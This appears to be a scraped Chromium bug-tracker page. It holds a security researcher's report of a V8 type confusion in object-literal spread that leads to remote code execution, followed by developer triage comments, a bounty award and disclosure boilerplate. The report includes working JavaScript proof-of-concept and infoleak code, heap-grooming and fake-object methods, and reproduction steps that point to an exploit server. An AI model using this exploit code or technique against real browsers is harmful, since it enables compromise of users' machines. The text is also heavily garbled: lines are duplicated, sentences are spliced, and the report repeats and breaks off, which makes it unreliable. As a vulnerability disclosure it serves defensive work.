      This bug is split off from <span class="line"><!---->This bug is split off from <!----></span>Issue 1260109<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1260109" title="Security: [Umbrella Bug] V8 CreateLiteral type confusion when processing ..spread leads to RCE + RenderFrameHostImpl logic error leading browser UAF"><!---->Issue 1260109<!----></a> <span class="line"><!----> <!----></span>to track the V8 type confusion bug portion of that report. Details below are copied from that bug. <span class="line"><!---->to track the V8 type confusion bug portion of that report. Details below are copied from that bug. <!----></span><br><br>-------------------------<b class="line"><!---->-------------------------<!----></b><br><br>= RCE: Type confusion when creating an object literal with the `...spread operation`<span class="line"><!---->= RCE: Type confusion when creating an object literal with the `...spread operation`<!----></span><br>-------------------------<b class="line"><!---->-------------------------<!----></b>-------------------------------------------------------<span class="line"><!---->-------------------------------------------------------<!----></span><br><br>I. VULNERABILITY DETAILS<span class="line"><!---->I. VULNERABILITY DETAILS<!----></span><br><br>When creating an object literal with the `...spread` operator the bytecode generator has two branches, I'll be focusing on the first branch [0]. If the first "argument" when creating the object literal is a `...spread` operator the bytecode generator will output a `CloneObject` [1]. `CloneObject` will call `CloneObjectIC_Slow` if the feedback vector is not set. `CloneObjectIC_Slow` will only set the properties in the `target` (`literal` in this case) object if they are in the `source` object. This is important for later.<span class="line"><!---->When creating an object literal with the `...spread` operator the bytecode generator has two branches, I'll be focusing on the first branch [0]. If the first "argument" when creating the object literal is a `...spread` operator the bytecode generator will output a `CloneObject` [1]. `CloneObject` will call `CloneObjectIC_Slow` if the feedback vector is not set. `CloneObjectIC_Slow` will only set the properties in the `target` (`literal` in this case) object if they are in the `source` object. This is important for later.<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>var source = { n : 5 };<span class="line"><!---->var source = { n : 5 };<!----></span><br>var object = { ...source };<span class="line"><!---->var object = { ...source };<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Next within the bytecode generator, if any indexes are in being declared in the object literal after the `...spread` operator then `Runtime_SetKeyedProperty` will be called on the `literal` object [2]. `Runtime_SetKeyedProperty` has two interesting characteristics: it will walk up prototype chains and it will trigger the `setter` callback. The combination of these two characteristics means we can define a setter on `Object.prototype` and assign a global variable to `this` within the getter to get a reference to the `literal` object. The example code below showcases how this works logically, the `duped` variable and `result` are the same object.<span class="line"><!---->Next within the bytecode generator, if any indexes are in being declared in the object literal after the `...spread` operator then `Runtime_SetKeyedProperty` will be called on the `literal` object [2]. `Runtime_SetKeyedProperty` has two interesting characteristics: it will walk up prototype chains and it will trigger the `setter` callback. The combination of these two characteristics means we can define a setter on `Object.prototype` and assign a global variable to `this` within the getter to get a reference to the `literal` object. The example code below showcases how this works logically, the `duped` variable and `result` are the same object.<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>Object.prototype.__defineSetter__(0, function() {<span class="line"><!---->Object.prototype.__defineSetter__(0, function() {<!----></span><br>   duped = this; <span class="line"><!---->   duped = this; <!----></span><br>});<span class="line"><!---->});<!----></span><br>var source = { n : 5 };<span class="line"><!---->var source = { n : 5 };<!----></span><br>var result = { ...source, 0 : 5 };<span class="line"><!---->var result = { ...source, 0 : 5 };<!----></span><br>%DebugPrint(result);<span class="line"><!---->%DebugPrint(result);<!----></span><br>%DebugPrint(duped);<span class="line"><!---->%DebugPrint(duped);<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Next within the bytecode generator, more spreads are processed. This uses `Runtime::kInlineCopyDataProperties` with `literal` as the target and the "argument" as the source [3]. Here we make the target == source by passing the `literal` object that we grabbed in the setter with a spread operator. This will trigger a DCHECK in Builtins::CopyDataProperties which the intrinsic `Runtime::kInlineCopyDataProperties` gets lowered to [4].<span class="line"><!---->Next within the bytecode generator, more spreads are processed. This uses `Runtime::kInlineCopyDataProperties` with `literal` as the target and the "argument" as the source [3]. Here we make the target == source by passing the `literal` object that we grabbed in the setter with a spread operator. This will trigger a DCHECK in Builtins::CopyDataProperties which the intrinsic `Runtime::kInlineCopyDataProperties` gets lowered to [4].<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>Object.prototype.__defineSetter__(0, function() {<span class="line"><!---->Object.prototype.__defineSetter__(0, function() {<!----></span><br>   duped = this; <span class="line"><!---->   duped = this; <!----></span><br>});<span class="line"><!---->});<!----></span><br>var source = { n : 5 };<span class="line"><!---->var source = { n : 5 };<!----></span><br>var result = { ...source, 0 : 5, ...duped };<span class="line"><!---->var result = { ...source, 0 : 5, ...duped };<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>II. EXPLOITATION DETAILS<span class="line"><!---->II. EXPLOITATION DETAILS<!----></span><br><br>Next if the map of the `target` object is deprecated, then the builtin SetOrCopyDataProperties will bailout to `Runtime_CopyDataProperties` which will eventually call `JSReceiver::FastAssign`. Within this function there is a call to `JSObject::CreateDataProperty` [6] that is not protected by a stable map check [5]. When source == destination, `JSReceiver::CreateDataProperty` can cause the object to convert from FastProperties to DictionaryProperties if an accessor is being redefined to a normal value AND the splitmap's transition array is full (if it contains 1536 transitions). Full Infoleak POC:<span class="line"><!---->Next if the map of the `target` object is deprecated, then the builtin SetOrCopyDataProperties will bailout to `Runtime_CopyDataProperties` which will eventually call `JSReceiver::FastAssign`. Within this function there is a call to `JSObject::CreateDataProperty` [6] that is not protected by a stable map check [5]. When source == destination, `JSReceiver::CreateDataProperty` can cause the object to convert from FastProperties to DictionaryProperties if an accessor is being redefined to a normal value AND the splitmap's transition array is full (if it contains 1536 transitions). Full Infoleak POC:<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>var a = { n : 5 };<span class="line"><!---->var a = { n : 5 };<!----></span><br><br>let return_double = function() {<span class="line"><!---->let return_double = function() {<!----></span><br>    return 5.5;<span class="line"><!---->    return 5.5;<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>Object.prototype.__defineSetter__(0, function() { <span class="line"><!---->Object.prototype.__defineSetter__(0, function() { <!----></span><br>    duped = this;<span class="line"><!---->    duped = this;<!----></span><br>    duped.__defineGetter__('getter', return_double);<span class="line"><!---->    duped.__defineGetter__('getter', return_double);<!----></span><br>    duped.o = 1.1;<span class="line"><!---->    duped.o = 1.1;<!----></span><br>    duped.p = 1.1;<span class="line"><!---->    duped.p = 1.1;<!----></span><br>    duped.q = 1.1;<span class="line"><!---->    duped.q = 1.1;<!----></span><br>    duped.r = 1.1;<span class="line"><!---->    duped.r = 1.1;<!----></span><br>    duped.s = 1.1;<span class="line"><!---->    duped.s = 1.1;<!----></span><br>    duped.t = 1.1;<span class="line"><!---->    duped.t = 1.1;<!----></span><br><br>    /*<span class="line"><!---->    /*<!----></span><br>        1. Create `b` an object that shares a map<span class="line"><!---->        1. Create `b` an object that shares a map<!----></span><br>           map with `duped`.<span class="line"><!---->           map with `duped`.<!----></span><br>    */<span class="line"><!---->    */<!----></span><br>    b = {};<span class="line"><!---->    b = {};<!----></span><br>    b.n = 5; <span class="line"><!---->    b.n = 5; <!----></span><br>    b.__defineGetter__('getter', return_double);<span class="line"><!---->    b.__defineGetter__('getter', return_double);<!----></span><br>    b.o = 1.1;<span class="line"><!---->    b.o = 1.1;<!----></span><br>    b.p = 1.1;<span class="line"><!---->    b.p = 1.1;<!----></span><br>    b.q = 1.1;<span class="line"><!---->    b.q = 1.1;<!----></span><br>    b.r = 1.1;<span class="line"><!---->    b.r = 1.1;<!----></span><br>    b.s = 1.1;<span class="line"><!---->    b.s = 1.1;<!----></span><br>    b.t = 1.1;<span class="line"><!---->    b.t = 1.1;<!----></span><br><br>    // deprecate `duped`'s map<span class="line"><!---->    // deprecate `duped`'s map<!----></span><br>    b.n = 1.1;<span class="line"><!---->    b.n = 1.1;<!----></span><br><br><br>    // Fill up the SplitMap's transition array<span class="line"><!---->    // Fill up the SplitMap's transition array<!----></span><br>    for (var i = 0; i < 1024 + 1024; i++) {<span class="line"><!---->    for (var i = 0; i &lt; 1024 + 1024; i++) {<!----></span><br>        var tmp = {};<span class="line"><!---->        var tmp = {};<!----></span><br>        tmp.n = 5;<span class="line"><!---->        tmp.n = 5;<!----></span><br>        tmp['tt' + i.toString()] = 5;<span class="line"><!---->        tmp['tt' + i.toString()] = 5;<!----></span><br>    }<span class="line"><!---->    }<!----></span><br><br>});<span class="line"><!---->});<!----></span><br><br>var obj = { ...a , 0 : 5 , ...duped};<span class="line"><!---->var obj = { ...a , 0 : 5 , ...duped};<!----></span><br><br>print(obj.o);<span class="line"><!---->print(obj.o);<!----></span><br>print(obj.p);<span class="line"><!---->print(obj.p);<!----></span><br>print(obj.q);<span class="line"><!---->print(obj.q);<!----></span><br>print(obj.r);<span class="line"><!---->print(obj.r);<!----></span><br>print(obj.s);<span class="line"><!---->print(obj.s);<!----></span><br>print(obj.t);<span class="line"><!---->print(obj.t);<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Turning this into an RCE was tough because unboxed doubles were removed and the number of constraints involved when src == dst, but I found a way by abusing the in-object properties. The basic idea is that when the map transitions from FastProperties to DictionaryProperties in-object properties are cleared, but the DescriptorArray will still have the cached descriptor of in_object() for the first four properties of the object [7]. Using determinism in scavenge garbage collection routines I was able to trigger a garbage collection after the in-object properties were cleared, resulting in the object being moved to old space and compacted with other objects. With a clever heap-groom I was able to place a BigInt object immediately after the object in OldSpace <span class="line"><!---->Turning this into an RCE was tough because unboxed doubles were removed and the number of constraints involved when src == dst, but I found a way by abusing the in-object properties. The basic idea is that when the map transitions from FastProperties to DictionaryProperties in-object properties are cleared, but the DescriptorArray will still have the cached descriptor of in_object() for the first four properties of the object [7]. Using determinism in scavenge garbage collection routines I was able to trigger a garbage collection after the in-object properties were cleared, resulting in the object being moved to old space and compacted with other objects. With a clever heap-groom I was able to place a BigInt object immediately after the object in OldSpace <!----></span><br><br>```<span class="line"><!---->```<!----></span><br>Before GC:<span class="line"><!---->Before GC:<!----></span><br>[Map][Properties][elements][inobject #0][inobject #1][inobject #2][inobject #3]<span class="line"><!---->[Map][Properties][elements][inobject #0][inobject #1][inobject #2][inobject #3]<!----></span><br><br>After GC:<span class="line"><!---->After GC:<!----></span><br>[Map][Properties][elements][Bigint Map][Bigint Length][digits][digits]<span class="line"><!---->[Map][Properties][elements][Bigint Map][Bigint Length][digits][digits]<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Giving me the ability to place any value in the now OOB read to the [inobject] slot after the GC, allowing me to create a Fake Object.<span class="line"><!---->Giving me the ability to place any value in the now OOB read to the [inobject] slot after the GC, allowing me to create a Fake Object.<!----></span><br><br>NOTE: The GC timing is deterministic for hosts with >2GB of memory. Hosts with less than 2GB of memory will require a different heap-spray. The exploit in its current state doesn't use the infoleak above and just uses fixed offsets so it will only work on 94.0.4606.81 on ubuntu.<span class="line"><!---->NOTE: The GC timing is deterministic for hosts with &gt;2GB of memory. Hosts with less than 2GB of memory will require a different heap-spray. The exploit in its current state doesn't use the infoleak above and just uses fixed offsets so it will only work on 94.0.4606.81 on ubuntu.<!----></span><br><br>III. REPRODUCTION DETAILS<span class="line"><!---->III. REPRODUCTION DETAILS<!----></span><br><br>POC<span class="line"><!---->POC<!----></span><br>1. Build D8<span class="line"><!---->1. Build D8<!----></span><br>2. ./out/x64.release/d8 poc.js<span class="line"><!---->2. ./out/x64.release/d8 poc.js<!----></span><br>3. ./out/x64.debug/d8 poc.js<span class="line"><!---->3. ./out/x64.debug/d8 poc.js<!----></span><br><br>EXPLOIT<span class="line"><!---->EXPLOIT<!----></span><br>1. Create a fresh Ubuntu 18.04.6 VM and install Chrome<span class="line"><!---->1. Create a fresh Ubuntu 18.04.6 VM and install Chrome<!----></span><br>2. Install Google Chrome version 94.0.4606.81<span class="line"><!---->2. Install Google Chrome version 94.0.4606.81<!----></span><br>3. Navigate to <span class="line"><!---->3. Navigate to <!----></span>https://chromepwn1.pw/parent-6a204bd89f3c8348afd5c77c717a097a.html<a class="undefined" target="_blank" href="https://chromepwn1.pw/parent-6a204bd89f3c8348afd5c77c717a097a.html"><!---->https://chromepwn1.pw/parent-6a204bd89f3c8348afd5c77c717a097a.html<!----></a><br>3a. NOTE: My server is required because I take advantage of site-isolation to spawn multiple renderer processes in different "sites".<span class="line"><!---->3a. NOTE: My server is required because I take advantage of site-isolation to spawn multiple renderer processes in different "sites".<!----></span><br>4. View the source in the attachment 28_fakeobj_remote_fresh.tar.gz<span class="line"><!---->4. View the source in the attachment 28_fakeobj_remote_fresh.tar.gz<!----></span><br><br>[0] <span class="line"><!---->[0]         Details from the reporter I forgot to copy over for the RCE exploit:<span class="line"><!---->Details from the reporter I forgot to copy over for the RCE exploit:<!----></span><br><br>-------<span class="line"><!---->-------<!----></span><br><br>To host the renderer exploit locally you need to change a few things:<span class="line"><!---->To host the renderer exploit locally you need to change a few things:<!----></span><br><br>SERVER<span class="line"><!---->SERVER<!----></span><br>Host three https sites:<span class="line"><!---->Host three https sites:<!----></span><br>site1.com<a class="undefined" target="_blank" href="https://site1.com"><!---->site1.com<!----></a><br>site2.com<a class="undefined" target="_blank" href="https://site2.com"><!---->site2.com<!----></a><br>site3.com<a class="undefined" target="_blank" href="https://site3.com"><!---->site3.com<!----></a><br><br>And then host the contents of 28_fakeobj_remote_fresh.tar.gz on each of the sites. Then replace all instances of chromepwn1.pwn, chromepwn2.pw, and chromepwn3.pw in the source with<span class="line"><!---->And then host the contents of 28_fakeobj_remote_fresh.tar.gz on each of the sites. Then replace all instances of chromepwn1.pwn, chromepwn2.pw, and chromepwn3.pw in the source with<!----></span> <span class="line"><!----> <!----></span>site1.com<a class="undefined" target="_blank" href="https://site1.com"><!---->site1.com<!----></a>,<span class="line"><!---->,<!----></span> <span class="line"><!----> <!----></span>site2.com<a class="undefined" target="_blank" href="https://site2.com"><!---->site2.com<!----></a>, and<span class="line"><!---->, and<!----></span> <span class="line"><!----> <!----></span>site3.com<a class="undefined" target="_blank" href="https://site3.com"><!---->site3.com<!----></a> in the javascript/html files within 28_fakeobj_remote_fresh.<span class="line"><!----> in the javascript/html files within 28_fakeobj_remote_fresh.<!----></span><br><br>CLIENT<span class="line"><!---->CLIENT<!----></span><br>1. Create a fresh Ubuntu 18.04.6 VM and install Chrome<span class="line"><!---->1. Create a fresh Ubuntu 18.04.6 VM and install Chrome<!----></span><br>2. Install Google Chrome version 94.0.4606.81<span class="line"><!---->2. Install Google Chrome version 94.0.4606.81<!----></span><br>3. Navigate to <span class="line"><!---->3. Testing initially, the iframe crashed immediately for me on Linux 94.0.4606.81. Retrying in an Incognito window the iframe didn't crash immediately but it did crash after I clicked "Calc" in the iframe. <span class="line"><!---->I was able to run this by swapping in `site1.localhost`, `site2.localhost`,  and `site3.localhost` (with entries pointing to 127.0.0.1 in /etc/hosts) and Caddy's built-in support for setting up a local root CA. Testing initially, the iframe crashed immediately for me on Linux 94.0.4606.81. Retrying in an Incognito window the iframe didn't crash immediately but it did crash after I clicked "Calc" in the iframe. <!----></span><br><br>I noticed there is some javascript commented out in the parent-6a...html file -- is this intentional? Should I add it back in?<span class="line"><!---->I noticed there is some javascript commented out in the parent-6a...html file -- is this intentional? Should I add it back in?<!----></span><br><br>I'll spin up an 18.04.6 VM instance next to test there -- this was on Debian.<span class="line"><!---->I'll spin up an 18.04.6 VM instance next to test there -- this was on Debian.<!----></span><mr-comment-content></mr-comment-content>

        Thanks for the report!<span class="line"><!---->Thanks for the report!<!----></span><br>The second patch (<span class="line"><!---->The second patch (<!----></span>https://crrev.com/c/3224666<a class="undefined" target="_blank" href="https://crrev.com/c/3224666"><!---->https://crrev.com/c/3224666<!----></a>)<span class="line"><!---->)<!----></span> has an issue with keyed properties, as used in your repro.<span class="line"><!----> has an issue with keyed properties, as used in your repro.<!----></span><br>I am not sure how quickly we would have caught this problem without your report, so thanks a lot!<span class="line"><!---->I am not sure how quickly we would have caught this problem without your report, so thanks a lot!<!----></span><br>As for the root cause: It should never happen that `target` is equal to `from`. The real root cause is that it was possible to leak the pointer to the object during creation by executing user code, which shouldn't happen (the setter in your poc shouldn't be executed).<span class="line"><!---->As for the root cause: It should never happen that `target` is equal to `from`. The real root cause is that it was possible to leak the pointer to the object during creation by executing user code, which shouldn't happen (the setter in your poc shouldn't be executed).<!----></span><mr-comment-content></mr-comment-content>

        pthier: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?<span class="line"><!---->pthier: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?<!----></span><br><br>If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?<span class="line"><!---->If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?<!----></span><br><br>If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.<span class="line"><!---->If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.<!----></span><br><br>Thanks for your time! To disable nags, add the Disable-Nags label.<span class="line"><!---->Thanks for your time!         *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

        Congratulations, Brendon! The VRP Panel has decided to award you $20,000 for this high quality report + V8 exploit and patch bonus. Thank you for all your efforts and great work!<span class="line"><!---->Congratulations, Brendon! The VRP Panel has decided to award you $20,000 for this high quality report + V8 exploit and patch bonus.       This bug is split off from <span class="line"><!---->This bug is split off from <!----></span>Issue 1260109<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1260109" title="Security: [Umbrella Bug] V8 CreateLiteral type confusion when processing ..spread leads to RCE + RenderFrameHostImpl logic error leading browser UAF"><!---->Issue 1260109<!----></a> <span class="line"><!----> <!----></span>to track the V8 type confusion bug portion of that report. Details below are copied from that bug. <span class="line"><!---->to track the V8 type confusion bug portion of that report. Details below are copied from that bug. <!----></span><br><br>-------------------------<b class="line"><!---->-------------------------<!----></b><br><br>= RCE: Type confusion when creating an object literal with the `...spread operation`<span class="line"><!---->= RCE: Type confusion when creating an object literal with the `...spread operation`<!----></span><br>-------------------------<b class="line"><!---->-------------------------<!----></b>-------------------------------------------------------<span class="line"><!---->-------------------------------------------------------<!----></span><br><br>I. VULNERABILITY DETAILS<span class="line"><!---->I. VULNERABILITY DETAILS<!----></span><br><br>When creating an object literal with the `...spread` operator the bytecode generator has two branches, I'll be focusing on the first branch [0]. If the first "argument" when creating the object literal is a `...spread` operator the bytecode generator will output a `CloneObject` [1]. `CloneObject` will call `CloneObjectIC_Slow` if the feedback vector is not set. `CloneObjectIC_Slow` will only set the properties in the `target` (`literal` in this case) object if they are in the `source` object. This is important for later.<span class="line"><!---->When creating an object literal with the `...spread` operator the bytecode generator has two branches, I'll be focusing on the first branch [0]. If the first "argument" when creating the object literal is a `...spread` operator the bytecode generator will output a `CloneObject` [1]. `CloneObject` will call `CloneObjectIC_Slow` if the feedback vector is not set. `CloneObjectIC_Slow` will only set the properties in the `target` (`literal` in this case) object if they are in the `source` object. This is important for later.<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>var source = { n : 5 };<span class="line"><!---->var source = { n : 5 };<!----></span><br>var object = { ...source };<span class="line"><!---->var object = { ...source };<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Next within the bytecode generator, if any indexes are in being declared in the object literal after the `...spread` operator then `Runtime_SetKeyedProperty` will be called on the `literal` object [2]. `Runtime_SetKeyedProperty` has two interesting characteristics: it will walk up prototype chains and it will trigger the `setter` callback. The combination of these two characteristics means we can define a setter on `Object.prototype` and assign a global variable to `this` within the getter to get a reference to the `literal` object. The example code below showcases how this works logically, the `duped` variable and `result` are the same object.<span class="line"><!---->Next within the bytecode generator, if any indexes are in being declared in the object literal after the `...spread` operator then `Runtime_SetKeyedProperty` will be called on the `literal` object [2]. `Runtime_SetKeyedProperty` has two interesting characteristics: it will walk up prototype chains and it will trigger the `setter` callback. The combination of these two characteristics means we can define a setter on `Object.prototype` and assign a global variable to `this` within the getter to get a reference to the `literal` object. The example code below showcases how this works logically, the `duped` variable and `result` are the same object.<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>Object.prototype.__defineSetter__(0, function() {<span class="line"><!---->Object.prototype.__defineSetter__(0, function() {<!----></span><br>   duped = this; <span class="line"><!---->   duped = this; <!----></span><br>});<span class="line"><!---->});<!----></span><br>var source = { n : 5 };<span class="line"><!---->var source = { n : 5 };<!----></span><br>var result = { ...source, 0 : 5 };<span class="line"><!---->var result = { ...source, 0 : 5 };<!----></span><br>%DebugPrint(result);<span class="line"><!---->%DebugPrint(result);<!----></span><br>%DebugPrint(duped);<span class="line"><!---->%DebugPrint(duped);<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Next within the bytecode generator, more spreads are processed. This uses `Runtime::kInlineCopyDataProperties` with `literal` as the target and the "argument" as the source [3]. Here we make the target == source by passing the `literal` object that we grabbed in the setter with a spread operator. This will trigger a DCHECK in Builtins::CopyDataProperties which the intrinsic `Runtime::kInlineCopyDataProperties` gets lowered to [4].<span class="line"><!---->Next within the bytecode generator, more spreads are processed. This uses `Runtime::kInlineCopyDataProperties` with `literal` as the target and the "argument" as the source [3]. Here we make the target == source by passing the `literal` object that we grabbed in the setter with a spread operator. This will trigger a DCHECK in Builtins::CopyDataProperties which the intrinsic `Runtime::kInlineCopyDataProperties` gets lowered to [4].<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>Object.prototype.__defineSetter__(0, function() {<span class="line"><!---->Object.prototype.__defineSetter__(0, function() {<!----></span><br>   duped = this; <span class="line"><!---->   duped = this; <!----></span><br>});<span class="line"><!---->});<!----></span><br>var source = { n : 5 };<span class="line"><!---->var source = { n : 5 };<!----></span><br>var result = { ...source, 0 : 5, ...duped };<span class="line"><!---->var result = { ...source, 0 : 5, ...duped };<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>II. EXPLOITATION DETAILS<span class="line"><!---->II. EXPLOITATION DETAILS<!----></span><br><br>Next if the map of the `target` object is deprecated, then the builtin SetOrCopyDataProperties will bailout to `Runtime_CopyDataProperties` which will eventually call `JSReceiver::FastAssign`. Within this function there is a call to `JSObject::CreateDataProperty` [6] that is not protected by a stable map check [5]. When source == destination, `JSReceiver::CreateDataProperty` can cause the object to convert from FastProperties to DictionaryProperties if an accessor is being redefined to a normal value AND the splitmap's transition array is full (if it contains 1536 transitions). Full Infoleak POC:<span class="line"><!---->Next if the map of the `target` object is deprecated, then the builtin SetOrCopyDataProperties will bailout to `Runtime_CopyDataProperties` which will eventually call `JSReceiver::FastAssign`. Within this function there is a call to `JSObject::CreateDataProperty` [6] that is not protected by a stable map check [5]. When source == destination, `JSReceiver::CreateDataProperty` can cause the object to convert from FastProperties to DictionaryProperties if an accessor is being redefined to a normal value AND the splitmap's transition array is full (if it contains 1536 transitions). Full Infoleak POC:<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>var a = { n : 5 };<span class="line"><!---->var a = { n : 5 };<!----></span><br><br>let return_double = function() {<span class="line"><!---->let return_double = function() {<!----></span><br>    return 5.5;<span class="line"><!---->    return 5.5;<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>Object.prototype.__defineSetter__(0, function() { <span class="line"><!---->Object.prototype.__defineSetter__(0, function() { <!----></span><br>    duped = this;<span class="line"><!---->    duped = this;<!----></span><br>    duped.__defineGetter__('getter', return_double);<span class="line"><!---->    duped.__defineGetter__('getter', return_double);<!----></span><br>    duped.o = 1.1;<span class="line"><!---->    duped.o = 1.1;<!----></span><br>    duped.p = 1.1;<span class="line"><!---->    duped.p = 1.1;<!----></span><br>    duped.q = 1.1;<span class="line"><!---->    duped.q = 1.1;<!----></span><br>    duped.r = 1.1;<span class="line"><!---->    duped.r = 1.1;<!----></span><br>    duped.s = 1.1;<span class="line"><!---->    duped.s = 1.1;<!----></span><br>    duped.t = 1.1;<span class="line"><!---->    duped.t = 1.1;<!----></span><br><br>    /*<span class="line"><!---->    /*<!----></span><br>        1. Create `b` an object that shares a map<span class="line"><!---->        1. Create `b` an object that shares a map<!----></span><br>           map with `duped`.<span class="line"><!---->           map with `duped`.<!----></span><br>    */<span class="line"><!---->    */<!----></span><br>    b = {};<span class="line"><!---->    b = {};<!----></span><br>    b.n = 5; <span class="line"><!---->    b.n = 5; <!----></span><br>    b.__defineGetter__('getter', return_double);<span class="line"><!---->    b.__defineGetter__('getter', return_double);<!----></span><br>    b.o = 1.1;<span class="line"><!---->    b.o = 1.1;<!----></span><br>    b.p = 1.1;<span class="line"><!---->    b.p = 1.1;<!----></span><br>    b.q = 1.1;<span class="line"><!---->    b.q = 1.1;<!----></span><br>    b.r = 1.1;<span class="line"><!---->    b.r = 1.1;<!----></span><br>    b.s = 1.1;<span class="line"><!---->    b.s = 1.1;<!----></span><br>    b.t = 1.1;<span class="line"><!---->    b.t = 1.1;<!----></span><br><br>    // deprecate `duped`'s map<span class="line"><!---->    // deprecate `duped`'s map<!----></span><br>    b.n = 1.1;<span class="line"><!---->    b.n = 1.1;<!----></span><br><br><br>    // Fill up the SplitMap's transition array<span class="line"><!---->    // Fill up the SplitMap's transition array<!----></span><br>    for (var i = 0; i < 1024 + 1024; i++) {<span class="line"><!---->    for (var i = 0; i &lt; 1024 + 1024; i++) {<!----></span><br>        var tmp = {};<span class="line"><!---->        var tmp = {};<!----></span><br>        tmp.n = 5;<span class="line"><!---->        tmp.n = 5;<!----></span><br>        tmp['tt' + i.toString()] = 5;<span class="line"><!---->        tmp['tt' + i.toString()] = 5;<!----></span><br>    }<span class="line"><!---->    }<!----></span><br><br>});<span class="line"><!---->});<!----></span><br><br>var obj = { ...a , 0 : 5 , ...duped};<span class="line"><!---->var obj = { ...a , 0 : 5 , ...duped};<!----></span><br><br>print(obj.o);<span class="line"><!---->print(obj.o);<!----></span><br>print(obj.p);<span class="line"><!---->print(obj.p);<!----></span><br>print(obj.q);<span class="line"><!---->print(obj.q);<!----></span><br>print(obj.r);<span class="line"><!---->print(obj.r);<!----></span><br>print(obj.s);<span class="line"><!---->print(obj.s);<!----></span><br>print(obj.t);<span class="line"><!---->print(obj.t);<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Turning this into an RCE was tough because unboxed doubles were removed and the number of constraints involved when src == dst, but I found a way by abusing the in-object properties. The basic idea is that when the map transitions from FastProperties to DictionaryProperties in-object properties are cleared, but the DescriptorArray will still have the cached descriptor of in_object() for the first four properties of the object [7]. Using determinism in scavenge garbage collection routines I was able to trigger a garbage collection after the in-object properties were cleared, resulting in the object being moved to old space and compacted with other objects. With a clever heap-groom I was able to place a BigInt object immediately after the object in OldSpace <span class="line"><!---->Turning this into an RCE was tough because unboxed doubles were removed and the number of constraints involved when src == dst, but I found a way by abusing the in-object properties. The basic idea is that when the map transitions from FastProperties to DictionaryProperties in-object properties are cleared, but the DescriptorArray will still have the cached descriptor of in_object() for the first four properties of the object [7]. Using determinism in scavenge garbage collection routines I was able to trigger a garbage collection after the in-object properties were cleared, resulting in the object being moved to old space and compacted with other objects. With a clever heap-groom I was able to place a BigInt object immediately after the object in OldSpace <!----></span><br><br>```<span class="line"><!---->```<!----></span><br>Before GC:<span class="line"><!---->Before GC:<!----></span><br>[Map][Properties][elements][inobject #0][inobject #1][inobject #2][inobject #3]<span class="line"><!---->[Map][Properties][elements][inobject #0][inobject #1][inobject #2][inobject #3]<!----></span><br><br>After GC:<span class="line"><!---->After GC:<!----></span><br>[Map][Properties][elements][Bigint Map][Bigint Length][digits][digits]<span class="line"><!---->[Map][Properties][elements][Bigint Map][Bigint Length][digits][digits]<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Giving me the ability to place any value in the now OOB read to the [inobject] slot after the GC, allowing me to create a Fake Object.<span class="line"><!---->Giving me the ability to place any value in the now OOB read to the [inobject] slot after the GC, allowing me to create a Fake Object.<!----></span><br><br>NOTE: The GC timing is deterministic for hosts with >2GB of memory. Hosts with less than 2GB of memory will require a different heap-spray. The exploit in its current state doesn't use the infoleak above and just uses fixed offsets so it will only work on 94.0.4606.81 on ubuntu.<span class="line"><!---->NOTE: The GC timing is deterministic for hosts with &gt;2GB of memory. Hosts with less than 2GB of memory will require a different heap-spray. The exploit in its current state doesn't use the infoleak above and just uses fixed offsets so it will only work on 94.0.4606.81 on ubuntu.<!----></span><br><br>III. REPRODUCTION DETAILS<span class="line"><!---->III. REPRODUCTION DETAILS<!----></span><br><br>POC<span class="line"><!---->POC<!----></span><br>1. Build D8<span class="line"><!---->1. Build D8<!----></span><br>2. ./out/x64.release/d8 poc.js<span class="line"><!---->2. ./out/x64.release/d8 poc.js<!----></span><br>3. ./out/x64.debug/d8 poc.js<span 